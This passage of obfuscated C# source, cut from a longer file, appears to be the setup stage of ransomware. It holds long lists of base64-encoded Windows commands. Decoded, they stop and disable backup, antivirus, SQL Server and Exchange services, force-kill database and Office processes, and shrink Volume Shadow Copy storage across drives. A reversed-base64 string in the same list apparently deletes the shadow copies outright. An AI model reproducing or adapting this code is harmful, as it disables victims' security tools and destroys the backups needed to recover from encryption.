		CZuAqRlrrEeJTK("c3RvcCBSVFZzY2FuIC95"),
		CZuAqRlrrEeJTK("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBZb29CYWNrdXAgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBZb29JVCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		CZuAqRlrrEeJTK("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		CZuAqRlrrEeJTK("c3RvcCBWU05BUFZTUyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCB2ZWVhbSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBBY3JTY2gyU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBzb3Bob3MgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBJSVNBZG1pbiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		CZuAqRlrrEeJTK("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTYW1TcyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBQT1AzU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTTVRQU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		CZuAqRlrrEeJTK("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTc3RwU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		CZuAqRlrrEeJTK("c3RvcCBVSTBEZXRlY3QgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		CZuAqRlrrEeJTK("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBXM1N2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		CZuAqRlrrEeJTK("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU09MQVAkVFBTIC95"),
		CZuAqRlrrEeJTK("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		CZuAqRlrrEeJTK("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		CZuAqRlrrEeJTK("c3RvcCBBY3JTY2gyU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		CZuAqRlrrEeJTK("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		CZuAqRlrrEeJTK("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBBUlNNIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		CZuAqRlrrEeJTK("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRQUk9EIC95"),
		CZuAqRlrrEeJTK("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBBbnRpdmlydXMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		CZuAqRlrrEeJTK("c3RvcCBBVlAgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		CZuAqRlrrEeJTK("c3RvcCBEQ0FnZW50IC95"),
		CZuAqRlrrEeJTK("c3RvcCBiZWRiZyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBFaHR0cFNydiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNTVMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		CZuAqRlrrEeJTK("c3RvcCBla3JuIC95"),
		CZuAqRlrrEeJTK("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		CZuAqRlrrEeJTK("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRUUFMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBudHJ0c2NhbiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBFU0hBU1JWIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTRFJTVkMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		CZuAqRlrrEeJTK("c3RvcCBLQVZGUyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxXcml0ZXIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBLQVZGU0dUIC95"),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBrYXZmc3NscCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		CZuAqRlrrEeJTK("c3RvcCBrbG5hZ2VudCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBtYWNtbnN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		CZuAqRlrrEeJTK("c3RvcCBtYXN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNeVNRTDU3IC95"),
		CZuAqRlrrEeJTK("c3RvcCBNY1NoaWVsZCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNeVNRTDgwIC95"),
		CZuAqRlrrEeJTK("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		CZuAqRlrrEeJTK("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		CZuAqRlrrEeJTK("c3RvcCBtZmVmaXJlIC95"),
		CZuAqRlrrEeJTK("c3RvcCB3YmVuZ2luZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		CZuAqRlrrEeJTK("c3RvcCBtZmVtbXMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCB3YmVuZ2luZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBSRVN2YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBtZmV2dHAgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		CZuAqRlrrEeJTK("c3RvcCBzYWNzdnIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTQVZTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTaE1vbml0b3IgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTbWNpbnN0IC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTbWNTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		CZuAqRlrrEeJTK("c3RvcCBzb3Bob3NzcHMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		CZuAqRlrrEeJTK("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		CZuAqRlrrEeJTK("c3RvcCBzd2lfZmlsdGVyIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBzd2lfdXBkYXRlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBUbUNDU0YgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxCcm93c2VyIC95"),
		CZuAqRlrrEeJTK("c3RvcCB0bWxpc3RlbiAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBUcnVlS2V5IC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		CZuAqRlrrEeJTK("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		CZuAqRlrrEeJTK("c3RvcCBXUlNWQyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		CZuAqRlrrEeJTK("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> zJTLaOwTssl = new List<string>
	{
		CZuAqRlrrEeJTK("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		CZuAqRlrrEeJTK("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		CZuAqRlrrEeJTK("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		CZuAqRlrrEeJTK("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		CZuAqRlrrEeJTK("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		CZuAqRlrrEeJTK("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		CZuAqRlrrEeJTK("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		CZuAqRlrrEeJTK("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> hiSTWycUAwo = new List<string>
	{
		CZuAqRlrrEeJTK("L0lNIG1zcHViLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIG15c3FsZC5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIGFnbnRzdmMuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIHRoZWJhdC5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIGVuY3N2Yy5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIENOVEFvU01nci5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIGRiZW5nNTAuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG9jb21tLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIHpvb2x6LmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIGRic25tcC5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIG1zcHViLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG9uZW5vdGUuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG91dGxvb2suZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHZpc2lvLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIHdpbndvcmQuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHdvcmRwYWQuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIG9jc3NkLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIG9yYWNsZS5leGUgL0Y="),
		CZuAqRlrrEeJTK("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		CZuAqRlrrEeJTK("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		CZuAqRlrrEeJTK("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> wpQZWUqYgzgX = new List<string>
	{
		CZuAqRlrrEeJTK(ApEzVvHpDX("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		CZuAqRlrrEeJTK("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		CZuAqRlrrEeJTK(ApEzVvHpDX("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

